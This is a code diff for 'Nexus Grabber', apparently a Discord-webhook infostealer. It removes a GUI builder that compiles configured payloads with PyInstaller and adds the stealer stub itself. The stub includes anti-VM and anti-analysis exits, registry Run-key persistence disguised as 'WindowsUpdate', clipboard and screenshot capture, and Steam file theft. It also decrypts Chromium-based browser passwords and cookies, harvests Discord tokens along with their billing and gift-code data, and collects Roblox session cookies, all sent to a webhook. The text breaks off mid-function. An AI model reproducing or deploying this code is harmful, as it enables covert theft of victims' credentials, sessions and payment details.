@@ -1,310 +1,595 @@
-import os
-import sys
-import json
-import subprocess
-import tempfile
-import threading
-import tkinter as tk
-from tkinter import messagebox, filedialog
-from pathlib import Path
-import customtkinter as ctk
+import os, sys, re, json, sqlite3, base64, shutil, tempfile, time, subprocess, threading, glob, win32crypt
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+import psutil
+from PIL import ImageGrab
+import win32clipboard
 import requests
 
-LOG_FILE = Path("nexus_builder.log")
-DEFAULT_CONFIG = {
-    "webhook": "",
-    "zip_password": "infected123",
-    "options": {
-        "screenshot": True,
-        "clipboard": True,
-        "steam": True,
-        "discord_tokens": True,
-        "discord_files": True,
-        "browser_passwords": True,
-        "cookies": True,
-        "file_grabber": True,
-        "file_extensions": [".txt", ".docx", ".pdf", ".jpg", ".png", ".zip"],
-        "grab_folders": ["Desktop", "Documents", "Downloads"],
-        "log_ip": True,
-        "startup": True,
-        "melt": False,
-        "anti_vm": True,
-        "anti_analysis": True
-    },
-    "build": {
-        "onefile": True,
-        "noconsole": True,
-        "icon": "",
-        "output_dir": "dist",
-        "optimize_size": True,
-        "use_upx": True,
-        "exclude_libs": ["matplotlib", "pandas", "numpy", "scipy", "tkinter"],
-        "target_mb": 0
-    }
-}
+WEBHOOK = "{WEBHOOK}"
+ZIP_PASSWORD = "{ZIP_PASSWORD}"
+ROAMING = os.environ['APPDATA']
+LOCAL = os.environ['LOCALAPPDATA']
 
-CONFIG_FILE = Path("nexus_config.json")
+SCREENSHOT = {SCREENSHOT}
+CLIPBOARD = {CLIPBOARD}
+STEAM = {STEAM}
+DISCORD_TOKENS = {DISCORD_TOKENS}
+DISCORD_FILES = {DISCORD_FILES}
+BROWSER_PASSWORDS = {BROWSER_PASSWORDS}
+COOKIES = {COOKIES}
+FILE_GRABBER = {FILE_GRABBER}
+LOG_IP = {LOG_IP}
+STARTUP = {STARTUP}
+MELT = {MELT}
+ANTI_VM = {ANTI_VM}
+ANTI_ANALYSIS = {ANTI_ANALYSIS}
+FILE_EXTS = {FILE_EXTENSIONS}
+GRAB_FOLDERS = {GRAB_FOLDERS}
 
-def load_config():
-    if CONFIG_FILE.exists():
-        with open(CONFIG_FILE, 'r') as f:
-            return json.load(f)
-    else:
-        save_config(DEFAULT_CONFIG)
-        return DEFAULT_CONFIG.copy()
+# ---------- Anti-detection (same) ----------
+if ANTI_VM:
+    def is_vm():
+        for d in ['vmware','vbox','virtualbox','qemu']:
+            if os.path.exists(f"C:\\Windows\\System32\\drivers\\{d}.sys"):
+                return True
+        return False
+    if is_vm():
+        sys.exit(0)
 
-def save_config(cfg):
-    with open(CONFIG_FILE, 'w') as f:
-        json.dump(cfg, f, indent=4)
-
-class NexusBuilder(ctk.CTk):
-    def __init__(self):
-        super().__init__()
-        self.title("Nexus Grabber Builder")
-        self.geometry("850x950")
-        self.configure(fg_color="#0a0a0a")
-        ctk.set_appearance_mode("dark")
-        ctk.set_default_color_theme("blue")
-        self.config = load_config()
-        self.building = False
-        self._build_ui()
-        self._load_to_ui()
-
-    def _build_ui(self):
-        self.main_frame = ctk.CTkFrame(self, corner_radius=15, fg_color="#111111")
-        self.main_frame.pack(fill="both", expand=True, padx=20, pady=20)
-        title = ctk.CTkLabel(self.main_frame, text="NEXUS GRABBER BUILDER", font=("Arial Black", 24, "bold"), text_color="#00ccff")
-        title.pack(pady=(20,10))
-        self.tabview = ctk.CTkTabview(self.main_frame, corner_radius=10, fg_color="#1a1a1a")
-        self.tabview.pack(fill="both", expand=True, padx=20, pady=10)
-        self.tabview.add("Webhooks")
-        self.tabview.add("Stealing")
-        self.tabview.add("Evasion")
-        self.tabview.add("Build")
-
-        webhook_frame = self.tabview.tab("Webhooks")
-        ctk.CTkLabel(webhook_frame, text="Discord Webhook URL:", font=("Arial", 14)).pack(anchor="w", padx=20, pady=(20,5))
-        self.webhook_entry = ctk.CTkEntry(webhook_frame, width=500, placeholder_text="https://discord.com/api/webhooks/...")
-        self.webhook_entry.pack(anchor="w", padx=20, pady=5)
-        self.test_btn = ctk.CTkButton(webhook_frame, text="Test Webhook", command=self._test_webhook, fg_color="#333333", width=150)
-        self.test_btn.pack(anchor="w", padx=20, pady=5)
-        ctk.CTkLabel(webhook_frame, text="ZIP Password (for file grabber):", font=("Arial", 14)).pack(anchor="w", padx=20, pady=(15,5))
-        self.zip_pass_entry = ctk.CTkEntry(webhook_frame, width=300, show="*", placeholder_text="infected123")
-        self.zip_pass_entry.pack(anchor="w", padx=20, pady=5)
-
-        steal_frame = self.tabview.tab("Stealing")
-        self.feature_vars = {}
-        features = [
-            ("screenshot", "📸 Take Screenshot"),
-            ("clipboard", "📋 Steal Clipboard"),
-            ("steam", "🎮 Steal Steam Session"),
-            ("discord_tokens", "🎟️ Discord Tokens"),
-            ("discord_files", "📁 Discord Local Files"),
-            ("browser_passwords", "🔑 Browser Passwords"),
-            ("cookies", "🍪 Browser Cookies"),
-            ("file_grabber", "📦 File Grabber (ZIP)"),
-            ("log_ip", "🌐 Log Public IP"),
-            ("startup", "🔄 Startup Persistence"),
-            ("melt", "💀 Self‑Delete")
-        ]
-        for i, (key, text) in enumerate(features):
-            var = tk.BooleanVar(value=self.config['options'].get(key, False))
-            self.feature_vars[key] = var
-            cb = ctk.CTkCheckBox(steal_frame, text=text, variable=var, fg_color="#00ccff", font=("Arial", 12))
-            cb.grid(row=i//2, column=i%2, sticky="w", padx=30, pady=8)
-        ctk.CTkLabel(steal_frame, text="File extensions to grab (comma separated):", font=("Arial", 12)).grid(row=6, column=0, sticky="w", padx=30, pady=(15,5))
-        self.ext_entry = ctk.CTkEntry(steal_frame, width=300, placeholder_text=".txt,.pdf,.jpg")
-        self.ext_entry.grid(row=6, column=1, sticky="w", padx=20, pady=5)
-
-        evade_frame = self.tabview.tab("Evasion")
-        self.anti_vm_var = tk.BooleanVar(value=self.config['options'].get('anti_vm', True))
-        self.anti_analysis_var = tk.BooleanVar(value=self.config['options'].get('anti_analysis', True))
-        ctk.CTkCheckBox(evade_frame, text="Anti‑VM Detection", variable=self.anti_vm_var, fg_color="#00ccff").pack(anchor="w", padx=30, pady=10)
-        ctk.CTkCheckBox(evade_frame, text="Anti‑Debug / Anti‑Analysis", variable=self.anti_analysis_var, fg_color="#00ccff").pack(anchor="w", padx=30, pady=10)
-
-        build_frame = self.tabview.tab("Build")
-        ctk.CTkLabel(build_frame, text="Output Directory:", font=("Arial", 13)).pack(anchor="w", padx=30, pady=(20,5))
-        out_frame = ctk.CTkFrame(build_frame, fg_color="transparent")
-        out_frame.pack(anchor="w", padx=30, pady=5)
-        self.out_dir_var = tk.StringVar(value=self.config['build'].get('output_dir', 'dist'))
-        self.out_entry = ctk.CTkEntry(out_frame, textvariable=self.out_dir_var, width=400)
-        self.out_entry.pack(side="left", padx=(0,10))
-        ctk.CTkButton(out_frame, text="Browse", command=self._browse_out, width=80, fg_color="#333333").pack(side="left")
-        ctk.CTkLabel(build_frame, text="Custom Icon (.ico) for spoofing:", font=("Arial", 13)).pack(anchor="w", padx=30, pady=(15,5))
-        icon_frame = ctk.CTkFrame(build_frame, fg_color="transparent")
-        icon_frame.pack(anchor="w", padx=30, pady=5)
-        self.icon_var = tk.StringVar(value=self.config['build'].get('icon', ''))
-        self.icon_entry = ctk.CTkEntry(icon_frame, textvariable=self.icon_var, width=400)
-        self.icon_entry.pack(side="left", padx=(0,10))
-        ctk.CTkButton(icon_frame, text="Select", command=self._browse_icon, width=80, fg_color="#333333").pack(side="left")
-        self.optimize_var = tk.BooleanVar(value=self.config['build'].get('optimize_size', True))
-        ctk.CTkCheckBox(build_frame, text="Optimize payload size (strip debug symbols)", variable=self.optimize_var, fg_color="#00ccff").pack(anchor="w", padx=30, pady=10)
-        self.upx_var = tk.BooleanVar(value=self.config['build'].get('use_upx', True))
-        ctk.CTkCheckBox(build_frame, text="Use UPX compression (if installed)", variable=self.upx_var, fg_color="#00ccff").pack(anchor="w", padx=30, pady=5)
-        ctk.CTkLabel(build_frame, text="Pad EXE to target size (MB):", font=("Arial", 13)).pack(anchor="w", padx=30, pady=(15,5))
-        self.mb_var = tk.StringVar(value=str(self.config['build'].get('target_mb', 0)))
-        mb_entry = ctk.CTkEntry(build_frame, textvariable=self.mb_var, width=100, placeholder_text="0 = no padding")
-        mb_entry.pack(anchor="w", padx=30, pady=5)
-        self.build_btn = ctk.CTkButton(build_frame, text="🔥 BUILD GRABBER 🔥", command=self._start_build, fg_color="#00ccff", font=("Arial", 16, "bold"), height=45)
-        self.build_btn.pack(pady=30)
-        self.progress = ctk.CTkProgressBar(build_frame, mode="indeterminate", width=400)
-        self.progress.pack(pady=10)
-        self.progress.set(0)
-        self.status_label = ctk.CTkLabel(self.main_frame, text="Ready", font=("Arial", 10), text_color="#aaaaaa")
-        self.status_label.pack(pady=(0,15))
-
-    def _browse_out(self):
-        d = filedialog.askdirectory()
-        if d:
-            self.out_dir_var.set(d)
-    def _browse_icon(self):
-        f = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
-        if f:
-            self.icon_var.set(f)
-    def _load_to_ui(self):
-        self.webhook_entry.insert(0, self.config.get('webhook', ''))
-        self.zip_pass_entry.insert(0, self.config['options'].get('zip_password', 'infected123'))
-        self.ext_entry.insert(0, ','.join(self.config['options'].get('file_extensions', [])))
-        self.mb_var.set(str(self.config['build'].get('target_mb', 0)))
-    def _save_to_config(self):
-        self.config['webhook'] = self.webhook_entry.get().strip()
-        self.config['options']['zip_password'] = self.zip_pass_entry.get().strip()
-        self.config['options']['file_extensions'] = [x.strip() for x in self.ext_entry.get().split(',') if x.strip()]
-        for key, var in self.feature_vars.items():
-            self.config['options'][key] = var.get()
-        self.config['options']['anti_vm'] = self.anti_vm_var.get()
-        self.config['options']['anti_analysis'] = self.anti_analysis_var.get()
-        self.config['build']['output_dir'] = self.out_dir_var.get()
-        self.config['build']['icon'] = self.icon_var.get()
-        self.config['build']['optimize_size'] = self.optimize_var.get()
-        self.config['build']['use_upx'] = self.upx_var.get()
+if ANTI_ANALYSIS:
+    def is_analysis():
+        bad = ['wireshark','procexp','procmon','ida','ollydbg','x64dbg','tcpview','fiddler']
         try:
-            mb = int(self.mb_var.get().strip()) if self.mb_var.get().strip() else 0
+            for proc in psutil.process_iter(['name']):
+                if proc.info['name'] and any(b in proc.info['name'].lower() for b in bad):
+                    return True
         except:
-            mb = 0
-        self.config['build']['target_mb'] = mb
-        save_config(self.config)
-    def _test_webhook(self):
-        url = self.webhook_entry.get().strip()
-        if not url:
-            messagebox.showerror("Error", "Enter webhook URL")
-            return
-        try:
-            r = requests.post(url, json={"content": "✅ Nexus test: Webhook works!"}, timeout=10)
-            if r.status_code == 204:
-                messagebox.showinfo("Success", "Webhook is valid.")
-            else:
-                messagebox.showwarning("Warning", f"Status: {r.status_code}")
-        except Exception as e:
-            messagebox.showerror("Error", str(e))
-    def _start_build(self):
-        if self.building:
-            return
-        self._save_to_config()
-        if not self.config['webhook']:
-            messagebox.showerror("Error", "Webhook URL required")
-            return
-        self.building = True
-        self.build_btn.configure(state="disabled", text="BUILDING...")
-        self.progress.start()
-        self.status_label.configure(text="Building...")
-        threading.Thread(target=self._build_worker, daemon=True).start()
-    def _pad_exe(self, path, target_mb):
-        if target_mb <= 0:
-            return
-        cur = os.path.getsize(path)
-        target = target_mb * 1048576
-        if cur >= target:
-            return
-        pad = target - cur
-        with open(path, "ab") as f:
-            f.write(os.urandom(pad))
-    def _build_worker(self):
-        try:
-            template_path = Path("Nexus_template.py")
-            if not template_path.exists():
-                raise FileNotFoundError("Nexus_template.py not found")
-            with open(template_path, 'r', encoding='utf-8') as f:
-                template = f.read()
-            template = template.replace("{WEBHOOK}", self.config['webhook'])
-            template = template.replace("{ZIP_PASSWORD}", self.config['options']['zip_password'])
-            flags = {
-                "SCREENSHOT": self.config['options'].get('screenshot', False),
-                "CLIPBOARD": self.config['options'].get('clipboard', False),
-                "STEAM": self.config['options'].get('steam', False),
-                "DISCORD_TOKENS": self.config['options'].get('discord_tokens', False),
-                "DISCORD_FILES": self.config['options'].get('discord_files', False),
-                "BROWSER_PASSWORDS": self.config['options'].get('browser_passwords', False),
-                "COOKIES": self.config['options'].get('cookies', False),
-                "FILE_GRABBER": self.config['options'].get('file_grabber', False),
-                "LOG_IP": self.config['options'].get('log_ip', True),
-                "STARTUP": self.config['options'].get('startup', False),
-                "MELT": self.config['options'].get('melt', False),
-                "ANTI_VM": self.config['options'].get('anti_vm', True),
-                "ANTI_ANALYSIS": self.config['options'].get('anti_analysis', True)
-            }
-            for k, v in flags.items():
-                template = template.replace(f"{{{k}}}", "True" if v else "False")
-            exts = self.config['options'].get('file_extensions', [])
-            ext_list = "[" + ",".join(f'"{e}"' for e in exts) + "]"
-            template = template.replace("{FILE_EXTENSIONS}", ext_list)
-            folders = self.config['options'].get('grab_folders', ['Desktop','Documents','Downloads'])
-            folders_list = "[" + ",".join(f'"{f}"' for f in folders) + "]"
-            template = template.replace("{GRAB_FOLDERS}", folders_list)
-            fd, stub_path = tempfile.mkstemp(suffix=".py")
-            with os.fdopen(fd, 'w', encoding='utf-8') as f:
-                f.write(template)
-            out_dir = self.config['build']['output_dir']
-            os.makedirs(out_dir, exist_ok=True)
-            cmd = [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole",
-                   "--distpath", out_dir, "--workpath", os.path.join(out_dir, "build_temp"),
-                   "--specpath", out_dir]
-            hidden = [
-                "sqlite3", "win32crypt", "cryptography", "cryptography.fernet",
-                "PIL", "PIL.ImageGrab", "psutil", "win32clipboard",
-                "requests", "urllib3"
-            ]
-            for h in hidden:
-                cmd.extend(["--hidden-import", h])
-            if self.config['build'].get('optimize_size', False):
-                cmd.append("--strip")
-            if self.config['build'].get('use_upx', False):
-                cmd.append("--upx-dir")
-                cmd.append(".")
-            if self.config['build'].get('icon'):
-                cmd.extend(["--icon", self.config['build']['icon']])
-            cmd.append(stub_path)
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
-            if result.returncode != 0:
-                raise Exception(f"PyInstaller error:\n{result.stderr}")
-            exe_path = None
-            for f in os.listdir(out_dir):
-                if f.endswith(".exe"):
-                    exe_path = os.path.join(out_dir, f)
-                    break
-            if not exe_path:
-                raise Exception("No exe found")
-            target_mb = self.config['build'].get('target_mb', 0)
-            if target_mb > 0:
-                self._pad_exe(exe_path, target_mb)
-            self.after(0, self._build_success, exe_path)
-        except Exception as e:
-            self.after(0, self._build_failed, str(e))
-        finally:
-            self.building = False
-            self.after(0, self._build_complete)
-    def _build_success(self, path):
-        size_mb = os.path.getsize(path) / 1048576
-        messagebox.showinfo("Success", f"Grabber built!\n{path}\nSize: {size_mb:.2f} MB")
-        self.status_label.configure(text=f"Build complete: {path}")
-    def _build_failed(self, err):
-        messagebox.showerror("Build Failed", err)
-        self.status_label.configure(text="Build failed")
-    def _build_complete(self):
-        self.build_btn.configure(state="normal", text="🔥 BUILD GRABBER 🔥")
-        self.progress.stop()
-        self.progress.set(0)
+            pass
+        return False
+    if is_analysis():
+        sys.exit(0)
 
+if STARTUP:
+    try:
+        import winreg
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable + " " + sys.argv[0])
+        key.Close()
+    except:
+        pass
+
+# ---------- Clean send functions ----------
+def send_embed(title, description, color=0x00ccff, fields=None):
+    embed = {"title": title, "description": description, "color": color}
+    if fields:
+        embed["fields"] = fields
+    try:
+        requests.post(WEBHOOK, json={"embeds": [embed]}, timeout=10)
+    except:
+        pass
+
+def send_file(filepath, caption=""):
+    if not os.path.exists(filepath):
+        return
+    with open(filepath, 'rb') as f:
+        files = {'file': (os.path.basename(filepath), f)}
+        try:
+            requests.post(WEBHOOK, files=files, data={'content': caption}, timeout=20)
+        except:
+            pass
+    try:
+        os.unlink(filepath)
+    except:
+        pass
+
+# ---------- Clipboard & Screenshot (unchanged) ----------
+def steal_clipboard():
+    try:
+        win32clipboard.OpenClipboard()
+        if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
+            data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
+            win32clipboard.CloseClipboard()
+            return data[:1000]
+        elif win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
+            data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
+            win32clipboard.CloseClipboard()
+            return data.decode('utf-8','ignore')[:1000]
+        else:
+            win32clipboard.CloseClipboard()
+    except:
+        pass
+    return None
+
+def take_screenshot():
+    try:
+        img = ImageGrab.grab()
+        tmp = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
+        img.save(tmp.name, "PNG")
+        tmp.close()
+        send_file(tmp.name, "📸 Screenshot")
+    except:
+        pass
+
+def steal_steam():
+    steam_path = os.path.join(os.environ.get('ProgramFiles(x86)','C:\\Program Files (x86)'), 'Steam', 'config', 'loginusers.vdf')
+    if os.path.exists(steam_path):
+        try:
+            with open(steam_path, 'r', encoding='utf-8', errors='ignore') as f:
+                return f.read()[:1500]
+        except:
+            pass
+    return None
+
+# ---------- Helper functions (unchanged) ----------
+def get_master_key(user_data_path):
+    local_state = os.path.join(user_data_path, "Local State")
+    if not os.path.exists(local_state):
+        return None
+    try:
+        with open(local_state, 'r', encoding='utf-8') as f:
+            local = json.load(f)
+        encrypted_key = base64.b64decode(local['os_crypt']['encrypted_key'])[5:]
+        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    except:
+        return None
+
+def decrypt_value(enc, key):
+    if not key or enc[:3] != b'v10':
+        return None
+    try:
+        nonce = enc[3:15]
+        ciphertext = enc[15:-16]
+        tag = enc[-16:]
+        aesgcm = AESGCM(key)
+        return aesgcm.decrypt(nonce, ciphertext + tag, None).decode('utf-8')
+    except:
+        return None
+
+def extract_tokens_from_leveldb(folder):
+    tokens = []
+    regex = re.compile(r'[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}')
+    leveldb = os.path.join(folder, "Local Storage", "leveldb")
+    if not os.path.exists(leveldb):
+        return tokens
+    for f in os.listdir(leveldb):
+        if f.endswith(('.ldb','.log')):
+            try:
+                with open(os.path.join(leveldb, f), 'rb') as fd:
+                    data = fd.read().decode('utf-8','ignore')
+                tokens.extend(regex.findall(data))
+            except:
+                pass
+    return tokens
+
+def extract_tokens_from_browser(browser_path, name):
+    tokens = []
+    if "Opera" in name:
+        profile = browser_path
+    else:
+        profile = os.path.join(browser_path, "Default")
+    if not os.path.exists(profile):
+        return tokens
+    master = get_master_key(browser_path)
+    if not master:
+        return tokens
+    cookies_db = os.path.join(profile, "Cookies")
+    if not os.path.exists(cookies_db):
+        return tokens
+    tmp = tempfile.mktemp()
+    try:
+        shutil.copy2(cookies_db, tmp)
+        conn = sqlite3.connect(tmp)
+        c = conn.cursor()
+        c.execute("SELECT encrypted_value FROM cookies WHERE host_key LIKE '%discord.com%' AND name='token'")
+        row = c.fetchone()
+        if row and isinstance(row[0], bytes):
+            dec = decrypt_value(row[0], master)
+            if dec:
+                tokens.append(dec)
+        conn.close()
+    except:
+        pass
+    finally:
+        try: os.unlink(tmp)
+        except: pass
+    return tokens
+
+def validate_token(token):
+    headers = {"Authorization": token.strip()}
+    try:
+        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
+        if r.status_code == 200:
+            data = r.json()
+            user = data['username'] + '#' + str(data.get('discriminator','0'))
+            uid = data['id']
+            email = data.get('email','No email')
+            mfa = data.get('mfa_enabled',False)
+            nitro = data.get('premium_type',0)
+            nitro_names = {0:'No Nitro',1:'Nitro Classic',2:'Nitro',3:'Nitro Basic'}
+            nitro_str = nitro_names.get(nitro,'Unknown')
+            billing = "None"
+            try:
+                br = requests.get("https://discordapp.com/api/v9/users/@me/billing/payment-sources", headers=headers, timeout=10)
+                if br.status_code == 200:
+                    sources = br.json()
+                    methods = {'Card':0,'Paypal':0}
+                    for s in sources:
+                        if s.get('type') == 1: methods['Card'] += 1
+                        elif s.get('type') == 2: methods['Paypal'] += 1
+                    billing = ', '.join(f"{k} ({v})" for k,v in methods.items() if v>0) or 'None'
+            except:
+                pass
+            gifts = []
+            try:
+                gr = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers, timeout=10)
+                if gr.status_code == 200:
+                    for g in gr.json():
+                        if isinstance(g,dict) and g.get('code') and g.get('promotion',{}).get('outbound_title'):
+                            gifts.append(f"{g['promotion']['outbound_title']}: {g['code']}")
+            except:
+                pass
+            gifts_str = '\n'.join(gifts) if gifts else 'None'
+            return (user, uid, email, mfa, nitro_str, billing, gifts_str, token)
+    except:
+        pass
+    return None
+
+def get_all_tokens():
+    tokens = []
+    threads = []
+    discord_clients = {
+        "Discord": os.path.join(ROAMING, "discord"),
+        "Discord Canary": os.path.join(ROAMING, "discordcanary"),
+        "Lightcord": os.path.join(ROAMING, "Lightcord"),
+        "Discord PTB": os.path.join(ROAMING, "discordptb"),
+        "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),
+        "Opera GX": os.path.join(ROAMING, "Opera Software", "Opera GX Stable")
+    }
+    for path in discord_clients.values():
+        if os.path.exists(path):
+            t = threading.Thread(target=lambda p=path: tokens.extend(extract_tokens_from_leveldb(p)))
+            t.start()
+            threads.append(t)
+    browser_paths = {
+        "Amigo": os.path.join(LOCAL, "Amigo", "User Data"),
+        "Torch": os.path.join(LOCAL, "Torch", "User Data"),
+        "Kometa": os.path.join(LOCAL, "Kometa", "User Data"),
+        "Orbitum": os.path.join(LOCAL, "Orbitum", "User Data"),
+        "CentBrowser": os.path.join(LOCAL, "CentBrowser", "User Data"),
+        "7Star": os.path.join(LOCAL, "7Star", "7Star", "User Data"),
+        "Sputnik": os.path.join(LOCAL, "Sputnik", "Sputnik", "User Data"),
+        "Vivaldi": os.path.join(LOCAL, "Vivaldi", "User Data"),
+        "Chrome SxS": os.path.join(LOCAL, "Google", "Chrome SxS", "User Data"),
+        "Chrome": os.path.join(LOCAL, "Google", "Chrome", "User Data"),
+        "Epic Privacy Browser": os.path.join(LOCAL, "Epic Privacy Browser", "User Data"),
+        "Microsoft Edge": os.path.join(LOCAL, "Microsoft", "Edge", "User Data"),
+        "Uran": os.path.join(LOCAL, "uCozMedia", "Uran", "User Data"),
+        "Yandex": os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data"),
+        "Brave": os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data"),
+        "Iridium": os.path.join(LOCAL, "Iridium", "User Data")
+    }
+    for name, path in browser_paths.items():
+        if os.path.exists(path):
+            t = threading.Thread(target=lambda n=name, p=path: tokens.extend(extract_tokens_from_browser(p, n)))
+            t.start()
+            threads.append(t)
+    for t in threads:
+        t.join()
+    tokens = list(set(tokens))
+    results = []
+    for tok in tokens:
+        info = validate_token(tok)
+        if info:
+            results.append(info)
+    return results
+
+def steal_discord_files():
+    files = []
+    folders = ["discord", "discordptb", "discordcanary", "Lightcord"]
+    for d in folders:
+        path = os.path.join(ROAMING, d)
+        if os.path.exists(path):
+            for root, _, filenames in os.walk(path):
+                for fn in filenames:
+                    if fn.endswith(('.log','.ldb','Local State')):
+                        files.append(f"{d}/{fn}")
+    return files[:30]
+
+def steal_roblox_cookies():
+    roblox_cookies = []
+    browser_paths = {
+        "Chrome": os.path.join(LOCAL, "Google", "Chrome", "User Data"),
+        "Edge": os.path.join(LOCAL, "Microsoft", "Edge", "User Data"),
+        "Brave": os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data"),
+        "Vivaldi": os.path.join(LOCAL, "Vivaldi", "User Data"),
+        "Yandex": os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data"),
+        "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),
+        "Opera GX": os.path.join(ROAMING, "Opera Software", "Opera GX Stable"),
+        "Amigo": os.path.join(LOCAL, "Amigo", "User Data"),
+        "Torch": os.path.join(LOCAL, "Torch", "User Data"),
+        "Kometa": os.path.join(LOCAL, "Kometa", "User Data"),
+        "Orbitum": os.path.join(LOCAL, "Orbitum", "User Data"),
+        "CentBrowser": os.path.join(LOCAL, "CentBrowser", "User Data"),
+        "7Star": os.path.join(LOCAL, "7Star", "7Star", "User Data"),
+        "Sputnik": os.path.join(LOCAL, "Sputnik", "Sputnik", "User Data"),
+        "Chrome SxS": os.path.join(LOCAL, "Google", "Chrome SxS", "User Data"),
+        "Epic Privacy Browser": os.path.join(LOCAL, "Epic Privacy Browser", "User Data"),
+        "Uran": os.path.join(LOCAL, "uCozMedia", "Uran", "User Data"),
+        "Iridium": os.path.join(LOCAL, "Iridium", "User Data")
+    }
+    for name, user_data in browser_paths.items():
+        if not os.path.exists(user_data):
+            continue
+        if "Opera" in name:
+            profile = user_data
+        else:
+            profile = os.path.join(user_data, "Default")
+        if not os.path.exists(profile):
+            continue
+        master = get_master_key(user_data)
+        if not master:
+            continue
+        cookies_db = os.path.join(profile, "Cookies")
+        if not os.path.exists(cookies_db):
+            continue
+        tmp = tempfile.mktemp()
+        try:
+            shutil.copy2(cookies_db, tmp)
+            conn = sqlite3.connect(tmp)
+            c = conn.cursor()
+            c.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%' AND name='.ROBLOSECURITY'")
+            rows = c.fetchall()
+            for host, n, val in rows:
+                if isinstance(val, bytes):
+                    dec = decrypt_value(val, master)
+                    if dec:
+                        roblox_cookies.append(f"{name} | {host} | {n} = {dec}")
+            conn.close()
+        except:
+            pass
+        finally:
+            try: os.unlink(tmp)
+            except: pass
+    firefox_profiles = glob.glob(os.path.join(ROAMING, "Mozilla", "Firefox", "Profiles", "*default*"))
+    for profile in firefox_profiles:
+        cookies_db = os.path.join(profile, "cookies.sqlite")
+        if not os.path.exists(cookies_db):
+            continue
+        tmp = tempfile.mktemp()
+        try:
+            shutil.copy2(cookies_db, tmp)
+            conn = sqlite3.connect(tmp)
+            c = conn.cursor()
+            c.execute("SELECT host, name, value FROM moz_cookies WHERE host LIKE '%roblox.com%' AND name='.ROBLOSECURITY'")
+            rows = c.fetchall()
+            for host, name, value in rows:
+                if value:
+                    roblox_cookies.append(f"Firefox | {host} | {name} = {value}")
+            conn.close()
+        except:
+            pass
+        finally:
+            try: os.unlink(tmp)
+            except: pass
+    return roblox_cookies
+
+def steal_browser_passwords():
+    all_creds = []
+    browser_paths = {
+        "Chrome": os.path.join(LOCAL, "Google", "Chrome", "User Data"),
+        "Edge": os.path.join(LOCAL, "Microsoft", "Edge", "User Data"),
+        "Brave": os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data"),
+        "Vivaldi": os.path.join(LOCAL, "Vivaldi", "User Data"),
+        "Yandex": os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data"),
+        "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),
+        "Opera GX": os.path.join(ROAMING, "Opera Software", "Opera GX Stable"),
+        "Amigo": os.path.join(LOCAL, "Amigo", "User Data"),
+        "Torch": os.path.join(LOCAL, "Torch", "User Data"),
+        "Kometa": os.path.join(LOCAL, "Kometa", "User Data"),
+        "Orbitum": os.path.join(LOCAL, "Orbitum", "User Data"),
+        "CentBrowser": os.path.join(LOCAL, "CentBrowser", "User Data"),
+        "7Star": os.path.join(LOCAL, "7Star", "7Star", "User Data"),
+        "Sputnik": os.path.join(LOCAL, "Sputnik", "Sputnik", "User Data"),
+        "Chrome SxS": os.path.join(LOCAL, "Google", "Chrome SxS", "User Data"),
+        "Epic Privacy Browser": os.path.join(LOCAL, "Epic Privacy Browser", "User Data"),
+        "Uran": os.path.join(LOCAL, "uCozMedia", "Uran", "User Data"),
+        "Iridium": os.path.join(LOCAL, "Iridium", "User Data")
+    }
+    for name, user_data in browser_paths.items():
+        if not os.path.exists(user_data):
+            continue
+        if "Opera" in name:
+            profile = user_data
+        else:
+            profile = os.path.join(user_data, "Default")
+        if not os.path.exists(profile):
+            continue
+        master = get_master_key(user_data)
+        if not master:
+            continue
+        db_file = os.path.join(profile, "Login Data")
+        if not os.path.exists(db_file):
+            continue
+        tmp = tempfile.mktemp()
+        try:
+            shutil.copy2(db_file, tmp)
+            conn = sqlite3.connect(tmp)
+            c = conn.cursor()
+            c.execute("SELECT origin_url, username_value, password_value FROM logins")
+            for url, user, pw in c.fetchall():
+                if isinstance(pw, bytes):
+                    dec = decrypt_value(pw, master)
+                    if user and dec:
+                        all_creds.append(f"{name}: {url}\n└ {user} : {dec}")
+            conn.close()
+        except:
+            pass
+        finally:
+            try: os.unlink(tmp)
+            except: pass
+    return all_creds
+
+def steal_cookies():
+    all_cookies = []
+    browser_paths = {
+        "Chrome": os.path.join(LOCAL, "Google", "Chrome", "User Data"),
+        "Edge": os.path.join(LOCAL, "Microsoft", "Edge", "User Data"),
+        "Brave": os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data"),
+        "Vivaldi": os.path.join(LOCAL, "Vivaldi", "User Data"),
+        "Yandex": os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data"),
+        "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),
+        "Opera GX": os.path.join(ROAMING, "Opera Software", "Opera GX Stable"),
+    }
+    for name, user_data in browser_paths.items():
+        if not os.path.exists(user_data):
+            continue
+        if "Opera" in name:
+            profile = user_data
+        else:
+            profile = os.path.join(user_data, "Default")
+        if not os.path.exists(profile):
+            continue
+        master = get_master_key(user_data)
+        if not master:
+            continue
+        db_file = os.path.join(profile, "Cookies")
+        if not os.path.exists(db_file):
+            continue
+        tmp = tempfile.mktemp()
+        try:
